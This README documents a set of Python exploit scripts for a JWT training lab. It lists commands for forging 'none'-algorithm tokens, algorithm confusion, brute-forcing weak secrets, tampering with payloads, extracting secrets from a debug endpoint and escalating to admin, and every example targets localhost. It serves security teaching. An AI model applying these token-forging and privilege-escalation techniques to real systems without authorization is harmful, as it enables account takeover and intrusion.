# JWT Vulnerability Exploitation Tools

This folder contains Python scripts to exploit various JWT vulnerabilities demonstrated in the JWT lab.

## Prerequisites

Install required dependencies:

```
pip install -r requirements.txt
```

## Available Exploit Scripts

### 1. all_in_one.py

An all-in-one tool that combines all exploit techniques in a single interface:

```
python all_in_one.py decode --token <JWT_TOKEN>                  # Decode and analyze a token
python all_in_one.py none --url http://localhost:3000/api/none-alg   # Create and test a 'none' algorithm token
python all_in_one.py tamper --token <TOKEN> --field role --value admin --url http://localhost:3000/api/missing-validation  # Tamper with a token
python all_in_one.py brute --token <TOKEN> --wordlist wordlist.txt   # Brute force the secret
python all_in_one.py extract --url http://localhost:3000/api/debug    # Extract the JWT secret from debug endpoint
python all_in_one.py forge --secret supersecretkey --url http://localhost:3000/api/admin   # Forge a token with a known secret
python all_in_one.py scan --url http://localhost:3000 --token <TOKEN>  # Scan for all vulnerabilities
```

### 2. weak_secret.py

Brute-force weak JWT secrets:

```
# Brute-force a JWT secret
python weak_secret.py <jwt_token> <wordlist_file>

# Forge a token with a known secret
python weak_secret.py forge <secret> [username] [role]
```

### 3. none_algorithm.py 

Create tokens with the 'none' algorithm:

```
# Create a 'none' algorithm token
python none_algorithm.py create [token_to_copy_payload_from]

# Exploit a vulnerable endpoint
python none_algorithm.py exploit <url> [token_to_copy_payload_from]

# Create a custom 'none' algorithm token
python none_algorithm.py custom <username> <role>
```

### 4. alg_confusion.py

Exploit algorithm confusion (HS256 vs RS256):

```
# Generate a confused algorithm token
python alg_confusion.py generate <secret_key>

# Full exploit with secret extraction
python alg_confusion.py exploit <base_url>

# Direct exploit with known secret
python alg_confusion.py direct <target_url> <secret_key>
```

### 5. signature_bypass.py

Modify JWT payload without changing the signature:

```
# Decode and display a JWT token
python signature_bypass.py decode <token>

# Modify a token's payload
python signature_bypass.py modify <token> <key> <value>

# Exploit a vulnerable endpoint
python signature_bypass.py exploit <url> <token> <key> <value>

# Elevate privileges in one step
python signature_bypass.py elevate <url> <token>
```

### 6. secret_leak.py

Extract and use leaked JWT secrets:

```
# Find and extract JWT secret
python secret_leak.py extract <debug_endpoint_url>

# Forge a token with a known secret
python secret_leak.py forge <secret> [username]

# Full exploit (extract, forge, and test admin access)
python secret_leak.py exploit <base_url>

# Test admin access with an existing token
python secret_leak.py test <admin_url> <token>
```

## Example Exploitation Workflow

1. First, extract the JWT secret from the debug endpoint:
   ```
   python secret_leak.py extract http://localhost:3000/api/debug
   ```

2. Use the extracted secret to forge an admin token:
   ```
   python secret_leak.py forge supersecretkey admin
   ```

3. Test the forged token on the admin endpoint:
   ```
   python secret_leak.py test http://localhost:3000/api/admin <forged_token>
   ```

4. Or run a full vulnerability scan:
   ```
   python all_in_one.py scan --url http://localhost:3000
   ```

## Disclaimer

These tools are for educational purposes only. Use them only against systems you have permission to test. 